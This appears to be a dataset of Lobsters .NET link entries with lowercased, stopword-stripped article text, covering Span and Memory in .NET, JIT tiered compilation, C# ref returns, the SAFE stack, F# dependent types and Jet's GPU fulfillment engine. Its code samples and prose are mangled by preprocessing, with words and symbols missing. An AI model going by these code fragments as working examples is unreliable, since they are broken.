instance live stack heap mean box span thus use span existing reflection invoke apis example require boxing mean span field class even nonreflike structs mean use span place might implicitly become field class instance capturing lambda local async method iterators may end field compilergenerated state machine also mean use span generic argument instance type argument could end getting boxed otherwise stored heap currently ref constraint available limitation immaterial many scenario particular computebound synchronous processing function asynchronous functionality another story issue cited beginning article around array array slice native memory exist whether dealing synchronous asynchronous operation yet span stored heap thus persisted across asynchronous operation answer memory memory look much like arraysegment public readonly struct memory â private readonly object object â private readonly int index â private readonly int length â create memory array slice would span nonreflike struct live heap want synchronous processing get span example static async task int checksumreadasync memory byte buffer stream stream â int bytesread await streamreadasync buffer â return checksum bufferspanslice bytesread â bufferslice bytesread span static int checksum span byte buffer span readonlyspan memory readonly equivalent readonlymemory expect span property return readonlyspan see figure quick summary builtin mechanism converting type figure nonallocatingnoncopying conversion spanrelated type mechanism arraysegment memory implicit cast asmemory method arraysegment readonlymemory implicit cast asmemory method arraysegment readonlyspan implicit cast asspan method arraysegment span implicit cast asspan method arraysegment array property memory arraysegment memorymarshaltrygetarray method memory readonlymemory implicit cast asmemory method memory span span property readonlymemory arraysegment memorymarshaltrygetarray method readonlymemory readonlyspan span property readonlyspan ref readonly indexer get accessor marshaling method span readonlyspan implicit cast asspan method span ref indexer get accessor marshaling method string readonlymemory char asmemory method string readonlyspan char implicit cast asspan method arraysegment ctor implicit cast memory ctor implicit cast asmemory method readonlymemory ctor implicit cast asmemory method readonlyspan ctor implicit cast asspan method span ctor implicit cast asspan method void readonlyspan ctor void span ctor notice memory object field strongly typed rather stored object highlight memory wrap thing array like systembuffersownedmemory ownedmemory abstract class used wrap data need lifetime tightly managed memory retrieved pool advanced topic beyond scope article memory used example wrap pointer native memory readonlymemory char also used string readonlyspan char span memory integrate net library previous memory code snippet notice call streamreadasync passing memory byte streamreadasync net today defined accept byte work support span friend hundred new member type added across net many overload existing arraybased stringbased method others entirely new type focused specific area processing example primitive type like parse overload accept readonlyspan char addition existing overload take string imagine situation expecting string contains two number separated comma want parse two number today might write code like string input int commapos inputindexof int first intparse inputsubstring commapos int second intparse inputsubstring commapos however incurs two string allocation writing performancesensitive code may two string allocation many instead write string input readonlyspan char inputspan input int commapos inputindexof int first intparse inputspanslice commapos int second intparse inputspanslice commapos using new spanbased parse overload made whole operation allocationfree similar parsing formatting method exist primitive like core type like datetime timespan guid even higherlevel type like biginteger ipaddress fact many method added across framework systemrandom systemtextstringbuilder systemnetsockets overload added make working readonly span readonly memory simple efficient even carry additional benefit example stream method public virtual valuetask int readasync â memory byte destination â cancellationtoken cancellationtoken default notice unlike existing readasync method accepts byte return task int overload accepts memory byte instead byte also return valuetask int instead task int valuetask struct help avoid allocation case asynchronous method frequently expected return synchronously unlikely cache completed task common return value instance runtime cache completed task bool result true one result false cache four billion task object possible result value task int quite common stream implementation buffer way make readasync call complete synchronously new readasync overload return valuetask int mean asynchronous stream read operation complete synchronously entirely allocationfree valuetask also used new overload overload socketreceiveasync socketsendasync websocketreceiveasync textreaderreadasync addition place span allows framework include method past raised memory safety concern consider situation want create string containing randomly generated value id kind today might write code requires allocating char array like int length random rand var char new char length int charslength â char char randnext string id new string char could instead use stackallocation even take advantage span char avoid needing use unsafe code approach also take advantage new string constructor accepts readonlyspan char like int length random rand span char char stackalloc char length int charslength â char char randnext string id new string char better avoided heap allocation still forced copy string data generated stack approach also work amount space required something small enough stack length short like byte fine thousand byte could easily lead stack overflow situation could write memory directly instead span allows addition new constructor string also create method public static string create tstate â int length tstate state spanaction char tstate action public delegate void spanaction targ span span targ arg method implemented allocate string hand writable span write order fill content string constructed note stackonly nature span beneficial case guaranteeing span refers internal storage cease exist constructor completes making impossible use span mutate string construction complete int length random rand string id stringcreate length rand span char char random r â int charslength â â â â char char rnext â avoided allocation writing directly memory heap mean also avoiding copy constrained size limitation stack beyond core framework type gaining new member many new net type developed work span efficient processing specific scenario example developer looking write highperformance microservices web site heavy text processing earn significant performance win encode decode string working enable new type like added operate span byte avoids unicode encoding decoding enables work native buffer common lowest level various networking stack readonlyspan byte guid value â int bytesconsumed standardformat p â throw new invaliddataexception functionality public consumption rather framework able utilize new span based memory based method better performance call site across net core switched using new readasync overload avoid unnecessary allocation parsing done allocating substring take advantage allocationfree parsing even niche type like gotten action taking advantage new span byte based trycomputehash method achieve monstrous saving allocation byte array per iteration algorithm might iterate thousand time well throughput improvement stop level core net library continues way stack aspnet core heavy dependency span example kestrel http parser written top future likely span exposed public apis lower level aspnet core middleware pipeline net runtime one way net runtime provides safety ensuring indexing array allow going beyond length array practice known bound checking example consider method methodimpl methodimploptionsnoinlining static int int data data machine typing article generated assembly method look like following subâ â â â â rsp â â â â â â cmpâ â â â â dword ptr â â â â â â jbeâ â â â â short â â â â â â movâ â â â â eax dword ptr â â â â â â addâ â â â â rsp â â â â â â ret â â â â â â call â â â â corinfohelprngchkfail â â â â â â cmp instruction comparing length data array index subsequent jbe instruction jumping range check failure routine range exception thrown jit need generate code ensures access go outside bound array mean every individual array access need bound check consider sum method static int sum int data â int sum â int datalength sum data â return sum jit need generate code ensures access data go outside bound array jit tell structure loop always range loop iterates element beginning end jit optimize away bound check array thus assembly code generated loop look like following â â â â â â movsxdâ â edx â â â â â â addâ â â â â eax dword ptr â â â â â â incâ â â â â edx â â â â â â cmpâ â â â â edx â â â â â â jgâ â â â â â short cmp instruction still loop simply compare value stored edx register length array stored register additional bound checking runtime applies similar optimization span span readonlyspan compare previous example following code change parameter type static int sum span int data â int sum â int datalength sum data â return sum generated assembly code almost identical â â â â â â movsxdâ â â â â â â â addâ â â â â ecx dword ptr â â â â â â incâ â â â â â â â â â â cmpâ â â â â edx â â â â â â jlâ â â â â â short assembly code similar part elimination bound check also relevant recognition span indexer intrinsic meaning jit generates special code indexer rather translating actual il code assembly illustrate runtime apply span kind optimization array making span efficient mechanism accessing data detail available blog post c language compiler already alluded feature added c language compiler help make span firstclass citizen net several feature c related span fact c compiler required use span look three feature ref structs noted earlier span reflike type exposed c version ref struct putting ref keyword struct tell c compiler allow use ref struct type like span field also sign associated constraint assigned type example wanted write struct enumerator span enumerator would need store span thus would need ref struct like public ref struct enumerator â private readonly span char span â private int index â stackalloc initialization span previous version c result stackalloc could stored pointer local variable c stackalloc used part expression target span done without using unsafe keyword thus instead writing span byte byte unsafe â byte tmp stackalloc byte length â byte new span byte tmp length write simply span byte byte stackalloc byte length also extremely useful situation need scratch space perform operation want avoid heap memory relatively small size previously two choice write two completely different code path allocating operating stackbased memory heapbased memory pin memory associated managed allocation delegate implementation also used stackbased memory written pointer manipulation unsafe code thing accomplished without code duplication safe code minimal ceremony span byte byte length stackalloc byte length new byte length code operates span byte span usage validation span refer data might associated given stack frame dangerous pas span around way might enable referring memory longer valid example imagine method tried following static span char formatguid guid guid â span char char stackalloc char â bool formatted guidtryformat char int charswritten â debugassert formatted â return charsslice charswritten uh oh space allocated stack trying return reference space moment return space longer valid use thankfully c compiler detects invalid usage ref structs fails compilation error error use local char context may expose referenced variable outside declaration scope next type method runtime optimization element discussed track included net core expect make way net framework core type like span well new type like also track made available systemmemorydll package compatible net standard make functionality available existing release net framework net core albeit without optimization implemented built platform preview package available try add reference systemmemorydll package nuget course keep mind breaking change current preview version actually delivered stable release change large part due feedback developer like experiment feature set please give try keep eye githubcomdotnetcoreclr githubcomdotnetcorefx repository ongoing work also find documentation ultimately success feature set relies developer trying providing feedback building library utilizing type goal providing efficient safe access memory modern net program look forward hearing experience even better working github improve net stephen toubâ work net microsoft find github githubcomstephentoub thanks following technical expert reviewing article krzysztof cwalina eric erhardt ahson khan jan kota jared parson marek safar vladimir sadov joseph tremoulet bill wagner jan vorlicek karel zikmund discus article msdn magazine forum
318,Lobsters,dotnet,"C#, F#, .NET programming",How does .NET JIT a method? (also featuring ‘Tiered Compilation’),http://www.mattwarren.org/2017/12/15/How-does-.NET-JIT-a-method-and-Tiered-Compilation/,net jit method also featuring tiered compilation,look internals tiered jit compilation net core aheadoftime aot scenario official microsoft doc say justintime jit compiler translates msil native code process actually work give u bit info creates attache stub method stub pass control jit compiler modifies stub point directly generated native code simple really new feature making way core clr tiered compilation java hotspot compiler work current clr allow jit transform method il native code method jited method jited runtimemethodhandlegetfunctionpointer method excellent blog post advanced call processing clr digging interface call net framework stubbased dispatch note excellent overview jit execution engine ee interaction rule determine type precode jit use precode stub methoddesc getprecodetype comment code botr tiered compilation tiered compilation excellent design doc future roadmap possibility take look related issuesprs introduce tiered jit low tier backoff jit enable aggressive inline policy history rejit rejit method profiling apis monitoring profiling tool work tiered compilation turned tiered compilation enabled currently using counter prestubcpp tieredcompilationmanager interpreted question previous post net interpreter answer got mono new net interpreter know llvm introduce tiered jit comment significant difference llvm support needed clr versus needed java idea get tiering framework use ryujit secondtier jit introduce tiered jit summary hacker news,look internals tiered jit compilation net core dec word net runtime clr predominantly used justintime jit compiler convert executable machine code leaving aside aheadoftime aot scenario time official microsoft doc say execution time justintime jit compiler translates msil native code compilation code must pas verification process examines msil metadata find whether code determined type safe process actually work doc give u bit info jit compilation take account possibility code might never called execution instead using time memory convert msil pe file native code convert msil needed execution store resulting native code memory accessible subsequent call context process loader creates attache stub method type type loaded initialized method called first time stub pass control jit compiler convert msil method native code modifies stub point directly generated native code therefore subsequent call jitcompiled method go directly native code simple really however want know rest post explore process detail addition look new feature making way core clr called tiered compilation big change clr till net method jit compiled first usage tiered compilation looking change allowing method recompiled optimised version much like java hotspot compiler work look future plan current clr allow jit transform method il native code well say picture speaks thousand word method jited method jited main thing note clr put precode stub divert initial method call prestubworker method ultimately call jit handwritten assembly code fragment consisting instruction method jited native code stable entry point created rest lifetime method clr guarantee change rest runtime depend remaining stable temporary entry point go away still available may method expecting call however associated precode fixup rewritten back patched point newly created native code instead prestubworker clr change address call instruction method called method jitted change address inside precode method call clr go via precode time newly jited method called call end native code reference stable entry point memory location intptr returned call runtimemethodhandlegetfunctionpointer method want see process action either recompile coreclr source add relevant debug information use windbg follow step excellent blog post topic see advanced call processing clr vance morrison excellent writeup digging interface call net framework stubbased dispatch finally different part core clr source code involved listed note post going look jit work interested take look excellent overview written one main developer jit execution engine ee interaction make work jit ee work together get idea involved take look comment describing rule determine type precode jit use info stored ee place full knowledge method jit ask mode work addition jit ask ee address function entry point done via following method precode stub different type precode available fixup remoting stub see rule one used methoddesc getprecodetype addition lowlevel mechanism implemented differently across cpu architecture comment code two implementation option temporary entrypoints compact entrypoints provide dense entrypoints possible patched point final code call unjitted method indirect call via slot precodes precode patched point final code eventually thus temporary entrypoint embedded code call unjitted method direct call direct jump use get best performance platform arm used also whole lot information precode available botr finally turn go far internals clr without coming across stub trampoline thunk etc instance used tiered compilation go want point tiered compilation much workinprogress indication get working currently set environment variable called complusexperimentaltieredcompilation appears current work focussed infrastructure make possible ie clr change assume fair amount testing performance analysis enabled default want learn goal feature fit wider process code versioning recommend reading excellent design doc including future roadmap possibility give indication involved far work going want follow along take look related issuesprs main one get started also nice background information available introduce tiered jit want understand eventually make use change jit minopts take look low tier backoff jit enable aggressive inline policy history rejit quick historical aside previously able get clr rejit method worked profiling apis meant write cc com code make happen addition rejit allowed method recompiled level ever produce optimised code mostly meant help monitoring profiling tool work finally work let look diagram firstly recap let take look thing end method jited tiered compilation turned diagram comparison stage look like tiered compilation enabled main difference tiered compilation forced method call go another level indirection pre stub make possible count number time method called hit threshold currently pre stub rewritten point optimised native code instead note original native code still available needed change reverted method call go back unoptimised version using counter see bit detail counter comment prestubcpp call counter counting call tiered compilation leave prestub place continue intercepting method invocation tieredcompilationmanager received enough call notification method backpatch bool fcanbackpatchprestub true ifdef featuretieredcompilation bool feligiblefortieredcompilation iseligiblefortieredcompilation feligiblefortieredcompilation callcounter pcallcounter getcallcounter fcanbackpatchprestub pcallcounter onmethodcalled endif essence stub call back tieredcompilationmanager tiered compilation triggered happens stub backpatched stop called interpreted wondering tiered compilation interpreted mode alone asked question info see previous post net interpreter answer got already interpreter available considered suitable production code fine question guessed correctly interpreter good enough shape run production code asis also significant issue want debugging profiling tool work given enough time effort solvable easiest place start different overhead nonoptimised optimised jitting machine nonoptimized jitting used time optimized jitting took similar il input size course expect result vary workload hardware getting first step checked make easier collect better measurement month ago maybe mono new net interpreter change thing know llvm finally using llvm compile code introduce tiered jit comment likely still significant difference llvm support needed clr versus needed java gc eh restriction one must place optimizer cite one example clrs gc currently tolerate managed pointer point end object java handle via basederived paired reporting mechanism either need plumb support kind paired reporting clr restrict llvm optimizer pass never create kind pointer top llilc jit slow sure ultimately kind code quality might produce figuring llilc might fit potential multitier approach yet exist seemed still seems premature idea get tiering framework use ryujit secondtier jit learn may discover indeed room higher tier jits least understand better else need thing make sense background info introduce tiered jit summary one favourite sideeffects microsoft making net open source developing open follow along workinprogress feature great able download latest code try see work underthehood yay os discus post hacker news
319,Lobsters,dotnet,"C#, F#, .NET programming","C# 7 Series, Part 7: Ref Returns",https://blogs.msdn.microsoft.com/mazhou/2017/12/12/c-7-series-part-7-ref-returns/,c series part ref return,c series part ref return article c series part value tuples part async main part default literal part discard part private protected part readonly structs background value reference ref return ref return call method ref return lvalue overload resolution restriction conclusion,c series part ref return minute read article c series part value tuples part async main part default literal part discard part private protected part readonly structs part post ref return background two way pas value method pas value argument passed method copy argument value type copy argument reference reference type passed change argument method change single assignment compound assignment reflected copy argumentargument reference reflected argument argument reference default way net language byval visual basic pas reference argument passed method either argument value type argument reference reference type directly passed copy generated change argument method change single assignment compound assignment reflect argument argument reference indicated using ref keyword c byref keyword visual basic example arrayresize method take ref parameter type array ref value modified method implementation point new space array resize able continue using variable array access new space byte data newâ byte arrayresize ref data consolewriteline new array size datalength method also return value caller c return value default c later ref return supported ref return ref return method return value reference similar ref value passed method argument ref return modified caller change assignment value reflect original value returned method c make ref return using return ref keywords please see following example privateâ staticâ refâ elementat refâ array int position â â â â array null â â â â â â â â â â â â throwâ newâ argumentnullexception nameof array â â â â â â â â position position arraylength â â â â â â â â â â â â throwâ newâ argumentoutofrangeexception nameof position â â â â â â â â returnâ ref array position purpose method obtain reference element specific position array later use reference change value element ref value change apply original value array use method use ref local privateâ staticâ void main string args â â â int data newâ int â â â consolewriteline change element data â â â refâ int value ref elementat ref data â â â change ref value â â â value â â â consolewriteline change element data visual studio intellisense indicate calling method ref return method output code call method ref return previous example get reference ref return value need use ref local also put ref keyword front method ref left right refâ int value ref elementat ref data also call method without ref keyword making value returned value int value elementat ref data case program output following however need either specify ref side ref side specify ref one side specify ref side additionally following code also work elementat ref data get output first example element position changed default value work ref return appear lvalue overload resolution return type part method signature consider overload following method definition may work public int int value public ref int int value following definition work parameter ref first method value second method public ref int ref int value public ref int int value therefore order overload ref return method need satisfy parameter rule use different count parameter use different type parameter use different value passing method value ref parameter restriction certain restriction apply value ref returned method must ref local source ref local actual refout argument method field type method declared ref return void type ref return null literal ref return ref local whose value null ref return async method return value might uncertain time async method return constant enums allowed ref returned conclusion ref return extension c language improve performance code reducing possibility copying value method return useful low level programming component interoperability crossplatform resource constrained scenario mobile iot etc feature requires clr change similar concept already exist use feature need use c language upgrading visual studio version later
321,Lobsters,dotnet,"C#, F#, .NET programming",Announcing the SAFE stack,https://compositional-it.com/blog/2017/09-22-safe-release/index.html,announcing safe stack,introduction aturn zure f able e lmish safe safe saturn model web programming azure fable elmish safe nt allornothing choice prototypical safe stack safe bookstore alternative safe stack partial safe stack onpremise partial safe stack safelite safe mobile safe nightwatch sample next safe site safestack,introduction throughout week published series article contributed wellknown people within f community focused web cloud programming today announcing launch safe stack initiative brings element together cohesive story saturn model serverside web programming azure cloudbased system fable javascriptenabled application elmish easytounderstand ui programming model collaboration partner today launched safe website hoping becomes goto place people developing functionalfirst cloudready web application safe important understand safe stack force route using specific technology named instead think starting place refer considering endtoend solution f suggest key behaviour safe web technology include embrace functional programming paradigm excellent support f readily deployable cloud provider adheres common standard possible little detail philosophy component stack saturn model key understand whilst fan saturn believe also room f friendly web programming model mentioned web programming article series also includes dropping giraffe freya websharper azure whilst compositional big fan azure recommend default cloud provider customer solution require scalable flexible easytouse service know everyone feel way reason safe stack ca nt work equally well amazon web service aws google cloud platform gcp fable fable provides superb experience f tojavascript transpilation flexible manner well experience play nicely net javascript ecosystem however solution websharper offer allinone f solution f web application certainly investigate option nonetheless fable remains default recommendation f andjavascriptecosystem integration elmish elmish provides excellent option ui model support core principle functional programming immutability expressionbased programming whilst taking full advantage many f language feature discriminated union pattern matching ui model available websharper piglet formlets model etc safe nt allornothing choice safe nt prescriptive solution force go either alternative application architecture utilise variety element safe stack different way prototypical safe stack typical safe stack using default technology set example available safe github repository safe bookstore app alternative safe stack alternative version safe stack us technology purpose original stack aws hosting giraffe serverside web stack also totally cool partial safe stack partial implementation safe stack us f server side us conventional typescript angularjs combination client side onpremise partial safe stack another partial implementation safe stack time using onpremise installation stack possibly using ii hosting web application whilst using onpremise database messaging system safelite finally let look use safe stack cutdown stack time httpenabled api running saturn return data sourced document db perhaps along data retrieved source example via type provider using fable create f stored procedure cosmos db normally written javascript safe mobile adding react native mix nothing stop creating mobile application using safe stack example safe nightwatch sample next early day safe feel particuarly sweet spot within f world hopeful f community come together collaborate make safe site goto place someone looking get running sort application please bookmark official website making lot update coming week including adding documentation reference application using alternative stack also considering following creating nuget metapackages contain reference package get running quickly creating readymade paketdependencies lock file use get started simple net core template readytogo solution whilst mindful avoiding codebloat adversely affect readymade solution please also follow official safestack twitter account well latest news coming week love hear feedback please reach u
322,Lobsters,dotnet,"C#, F#, .NET programming",WTF#,http://wtfsharp.net/,wtf,,curious happening f ecosystem whether longtime f lover functionally curious great mean keeping speed functional programming net platform
323,Lobsters,dotnet,"C#, F#, .NET programming",Dependent Types for F#,https://jackfoxy.github.io/DependentTypes/,dependent type f,dependent type dependent type extension method yet supported tutorial api reference domainlib dependenttypesconsole expecto dependenttypes domainlib creating generic wrapper validated value report issue documentation license file,computer science logic dependent type type whose definition depends value pair integer type pair integer second greater first dependent type wikipedia article dependent type project experiment bringing dependent type f supporting finer level type granularity consistent manner dependent type logic computer science take element specific type output typed element family type f support family type generic sense still use f net type output type familylike characteristic library present generic dependent type taking element specific input type new base type typed function base output type f net type family one type f option type input element belong output underlying type mimicking family two type f discriminated union type input element belongs member du mimicking family arbitrarily many type dependent type type dependenttype pi config pi pi config pi new unit pi type parameter includes configuration typed pi function map input element specified type element output type type pi config config config pi config configuration convenience allowing reuse function code serve multiple dependent type passing desired parameter convenient type implementation pi function emitting option type somedependenttype type somedependenttype pi config pi pi config option pi new unit pi construction similar dependent type sharing pi function look like open dependenttypes module digitsdef let verifydigits config value regexstringverify new regex config value type digitsvalidator config inherit pi int string string option config verifydigits type validdigits inherit digitsvalidator type inherit digitsvalidator type inherit digitsvalidator type inherit digitsvalidator type digit dependenttype digitsdefvaliddigits int string string option type dependenttype int string string option type dependenttype int string string option type dependenttype int string string option type somedigits somedependenttype digitsdefvaliddigits int string string type somedependenttype int string string type somedependenttype int string string type somedependenttype int string string let digit digitscreate dependenttype let dependenttype let none printfn somedigitstrycreate somedependenttype printfn somedependenttype printfn none printfn somedependenttype create safe somedependenttype create safe somedependenttype printfn systemnullreferenceexception systemnullreferenceexception object reference set instance object full validation function regexstringverify shown config value accepts digit string length presence module digitsdef strictly readability purpose segregating helper function type helper type must access level dependent type aliasing optional providing better readability trycreate lift option dependenttype dependent type support equality comparison trait base type extension method yet supported dependent pair type dependentpair sigma config sigma sigma config sigma new unit sigma pair input element resulting dependent type usage similar dependent type tutorial contains explanation dependent type library api reference contains automatically generated documentation type module function library domainlib project sample library useful dependent type trimmed nonempty nonnull string nonempty generic set utc datetime uppercase latin string undetermined specific length digit string undetermined specific length integer restricted range dependenttypesconsole project run demo dependent type expecto test project dependenttypes library domainlib sample dependent type library based original experiment robkuz limitedvalue type creating generic wrapper validated value discussion found report issue fork project submit pull request please also add test sample turned documentation library available public domain license allows modification redistribution commercial noncommercial purpose information see license file github repository namespace system namespace systemtext namespace systemtextregularexpressions val regexstringverify regex regex config int value string string option val regex regex multiple itemstype regex new pattern string regex overload member getgroupnames unit string member getgroupnumbers unit int member groupnamefromnumber int string member groupnumberfromname name string int member ismatch input string bool overload member match input string match overload member matchtimeout timespan member match input string matchcollection overload member option regexoptions regex pattern string regexregex pattern string option regexoptions regexregex pattern string option regexoptions matchtimeout timespan regex val config int val value string multiple itemsval string value string type string string multiple itemstype string new value char string overload member char int char member clone unit obj member compareto value obj int overload member contains value string bool member copyto sourceindex int destination char destinationindex int count int unit member endswith value string bool overload member equal obj obj bool overload member getenumerator unit charenumerator member gethashcode unit int string value nativeptr char stringstring value nativeptr sbyte stringstring value char stringstring c char count int stringstring value nativeptr char startindex int length int stringstring value nativeptr sbyte startindex int length int stringstring value char startindex int length int stringstring value nativeptr sbyte startindex int length int enc textencoding string stringisnullorwhitespace value string bool union case optionnone option val string stringtrim stringstringtrim paramarray trimchars char string regexismatch input string boolregexismatch input string startat int bool val length str string int union case optionsome value option type dependenttype pi config requires default constructor type unit unit type option option namespace dependenttypes val verifydigits config int value string string option multiple itemstype digitsvalidator inherit pi int string string option new config int digitsvalidator new config int digitsvalidator multiple itemstype pi config new config config pi config pi config member create x new config config pi config pi config multiple itemsval int value int requires member opexplicit type int type int measure int multiple itemstype validdigits inherit digitsvalidator new unit validdigits new unit validdigits multiple itemstype inherit digitsvalidator new unit new unit multiple itemstype inherit digitsvalidator new unit new unit multiple itemstype inherit digitsvalidator new unit new unit type digit dependenttype digitsdefvaliddigits int string string option multiple itemsunion case dependenttypedependenttype dependenttype pi config type dependenttype pi config requires pi pi config default constructor dependenttype override tostring unit string member value static member convertto x dependenttype x q r dependenttype b r requires x pi q r default constructor pi b r default constructor static member create x dependenttype pi config static member extract x dependenttype pi config static member trycreate x option dependenttype pi config option static member trycreate x dependenttype pi config option module digitsdeffrom index multiple itemstype validdigits inherit digitsvalidator new unit validdigits new unit digitsdefvaliddigits type dependenttype int string string option multiple itemstype inherit digitsvalidator new unit new unit type dependenttype int string string option multiple itemstype inherit digitsvalidator new unit new unit type dependenttype int string string option multiple itemstype inherit digitsvalidator new unit new unit type somedigits somedependenttype digitsdefvaliddigits int string string multiple itemsunion case somedependenttypesomedependenttype somedependenttype pi config type somedependenttype pi config requires pi pi config option default constructor somedependenttype override tostring unit string member value static member convertto x somedependenttype x q r somedependenttype b r requires x pi q r option default constructor pi b r option default constructor static member create x somedependenttype pi config static member extract x somedependenttype pi config static member trycreate x somedependenttype pi config option type somedependenttype int string string type somedependenttype int string string type somedependenttype int string string val digit dependenttype digitsdefvaliddigits int string string option static member dependenttypecreate x dependenttype pi config val dependenttype int string string option val dependenttype int string string option option static member dependenttypetrycreate x option dependenttype pi config optionstatic member dependenttypetrycreate x dependenttype pi config option val printfn format printftextwriterformat static member somedependenttypetrycreate x somedependenttype pi config option static member somedependenttypecreate x somedependenttype pi config
324,Lobsters,dotnet,"C#, F#, .NET programming",How Jet Built a GPU-Powered Fulfillment Engine with F# and CUDA,https://devblogs.nvidia.com/parallelforall/jet-gpu-powered-fulfillment/,jet built gpupowered fulfillment engine f cuda,aleagpu merchant selection problem complexity full search full search year cart complexity genetic algorithm implementation full search microservice layer conclusion gpuaccelerated fulfillment f cloud pdf deep learning pdf jet technology blog directly acknowledgement daniel egloff neerav kothari xiang zhang andrew shaeffer,ever looked shopping list tried optimize trip based thing like distance store price number item buy store quest smarter shopping cart neverending complexity finding even suboptimal solution problem quickly get hand especially true online shopping expands set fulfillment possibility local national scale ideally could shop online item list website would work find saving exactly jetcom jetcom ecommerce company acquired walmart known innovative pricing engine find optimal cart saving customer real time post discus jet tackle fulfillment optimization problem using gpus f azure microservices implemented solution f via aleagpu natural choice coding cuda solution net also cover relevant aspect microservice architecture merchant selection problem jetcom provides value finding efficiency system passing customer form lower price center jet smart merchant selection algorithm customer order several item usually fulfilled multiple merchant different warehouse goal find combination merchant warehouse minimizes total order cost including shipment cost commission bigger shopping cart higher potential saving also time consuming search optimal combination take example cart four item retail skus stock keeping unit local market four merchant figure show merchant price four skus shipping cost merchant possible fulfillment combination merchant provide table shipping cost show cost either individual skus multiple skus packaged together delimited comma plus sign respectively example cost ship individual sku merchant however sku sku shipped together figure initial cart four item total combination naive approach choosing merchant cheapest offer sku result total cart figure approach neglect shipping cost fails discover saving shipping multiple item merchant figure pricing cart taking cheapest net price allocation example merchant fulfill three skus shipping cost fulfilling order via merchant merchant brings total figure optimal combination figure better packing item together way find optimal combination saving customer figure show pricing every one combination cart figure optimal allocation complexity full search pricing every possible fulfillment combination find optimal solution exhaustive bruteforce search entire solution space full search approach merchant selection problem embarrassingly parallel enumerated fulfillment combination priced independently natural parallelism lead u initially use full search approach gpu turn full search prohibitive even gpu acceleration due exponential complexity merchant selection problem since genetic algorithm discussed next section guarantee fully optimal solution important use full search possible developed metric called full search year use measure computation time required merchant selection full search year number combination priced within year use gpu full search year cpu full search year indicate time required running either implementation full search second minute hour day derived full search year cart complexity merchant selection complexity total number fulfillment combination must priced order find optimal fulfillment lowest price cart complexity number combination offer item offer item offer item k illustrate complexity merchant selection problem application full search year metric dug log find cart timed customer tried place order timeouts tend occur often large number merchant fulfill item electronics figure show example customer ordering component build computer figure example cart required trillion combination leading timeout chart figure show number offer retail skus customer cart cart complexity combination time required find optimal fulfillment cart cpu full search year gpu full search day well outside target response time second given constraint problem quickly grows larger handled gpu full search within target time needed better scalable solution genetic algorithm address scalability issue decided apply genetic algorithm ga solve problem two important point consider ga approach ga find approximately optimal solution standard ga work search space astronomically large need reliable approximate solution near realtime jetcom constraint response time limit long spend producing consecutive generation population moreover since generation iteration serial process reduce computation time parallelizing iteration used four method address issue dramatically increasing population size reduce number iteration required convergence improving initial population including merchant combination likely good example rather starting initial population fully randomized combination include combination single merchant fulfill multiple retail skus since tends reduce shipping cost case identifying part population used guide behavior mutation crossover operator leveraging aiml choose appropriate configuration ga fourth method nontrivial introduced unique challenge hope cover detail future blog post implementation going take implementation detail gpu full search algorithm gpufs first want briefly discus algorithm selection three merchant selection algorithm use cpu implementation gpu full search gpu genetic algorithm gpuga approach strength weakness depending situation implementation us decision function choose three algorithm based cart complexity load example consider case single item checkout pricing singleitem cart gpu would take longer pricing cpu due cost data transfer gpu complex cart perform merchant selection within acceptable timeframe using gpufs choose gpuga since ga guarantee optimal result choosing best algorithm task unfortunately simple cart small cpufs elif cart big gpufs elif cart huge gpuga needed smart decision function address issue used machine learning train model based cart feature used improve function result order train model appropriately employ multiple algorithm develop way validate appraise compare multiple algorithm production data hope share detail work future blog post scope current discussion let focus detail gpufs algorithm microservice invokes figure example local market supply cart three item first need explain two core concept local market supply allocation local market supply array mapping fulfillment node offer retail sku cart figure show example localmarketsupply data structure see example node fulfill sku two possible offer goal search algorithm find cheapest fulfillment combination item customer cart consider scenario customer initiate checkout three item sku sku sku jetcom microservice query database find offer three retail skus us information build localmarketsupply structure cart actual search space merchant selection problem set possible fulfillment combination refer allocation single allocation array integer representing combination fulfillment option set retail skus priced index array represents id retail skus value index offer id chosen retail sku therefore set allocation local market supply defined figure would resemble table figure figure full search space hypothetical local market supply shown figure full search jetcom full search implementation straightforward one kernel function process possible allocation pricing one performing min reduction find cheapest aid explanation divide full search implementation two conceptual part search pricing search part essentially refers kernel code responsible finding cheapest allocation pricing part refers code actually price individual allocation let look search part first kernel main loop follows familiar strided access pattern need repeatedly refer local market supply determine retail skus fulfillment node fulfill store compressed supply shared memory let shared sharedexternarray addressofarray let supply compressedsupplyloadtoshared supply sharedreinterpret numretailskus let mutable minallocation let mutable minprice realmax let start blockidxx blockdimx threadidxx let stride griddimx blockdimx let mutable locallinear start locallinear numelements let allocation locallinear linearstart let price price allocation price minprice minprice price minallocation allocation locallinear locallinear stride perform warp reduce find best priceallocation warp let mutable pricedallocation pricedallocation minprice minallocation utilwarpsizelog let offset let peer devicefunctionshuffledown pricedallocation offset utilwarpsize pricedallocation synchronize thread reuse shared memory syncthreads prepare block reduce adding warp reduce result shared memory let mutable shared sharedreinterpret threadidxx utilwarpsizemask let warpid threadidxx utilwarpsizelog shared warpid syncthreads next perform block reduce find best price allocation among warp within block threadidxx warpid blockdimx utilwarpsize pricedallocation pricedallocationmin pricedallocation shared warpid outputprices blockidxx pricedallocationprice outputallocations blockidxx pricedallocationallocation need retrieve result gpu find priceallocation pair minimum price decode respective allocation back array int let decodeallocation jagged array offer retail sku id first dimension run sorted retail sku id second dimension offer given retail sku id let offeridsbyretailskuid localmarketlocalmarketsupplytoofferidsbyretailskuid prlocalmarketsupply let dims offeridsbyretailskuid arraymap fun fids fidslength let indexer rowmajor dims fun allocation let index allocation indexertoindex index arraymapi fun rsid idx offeridsbyretailskuid rsid idx finally getresults function copy array grid minimum back host performs min price find global minimum along accompanying allocation let getresults let price gpucopytohost price let allocation gpucopytohost allocation let price allocation arrayzip price allocation arrayminby fst let allocation decodeallocation allocation price allocation seen general flow search kernel let look pricing code allocation price function defined within kernel function let price allocation generalprice numretailskus numfulfillmentnodes fun fulfillmentnodes fun shippingrules fun commissionrules loopoffers allocation generalprice function price allocation calling pricefulfillmentnode incrementing fulfillmentnodeid within loop pricefulfillmentnode function return number skus computed allocation loop exit early possible note generalprice loopoffers higher order function price us partial function application pass partially applied loopoffers function along generalprice loopoffers function loop offer allocation fulfilled fulfillment node fnid every time loopoffers called loop retail sku invokes function f fulfillment node id offer retail sku equal current node pricedimplementing loopoffers higher order function provides abstraction various updatexyz function used within pricefulfillmentnode let loopoffers allocation fnid int f offer sku unit let offset ref allocation let f iter allocationiterator rsid int let idx allocationiteratordecode iter offset let oid supplyofferids itersupplyoffset idx let offer offer oid let sku retailskus rsid offerid oid offerfulfillmentnodeid fnid offerretailskuid rsid f offer sku allocationiterator type used gpu full search implementation encode allocation int improve performance use le memory 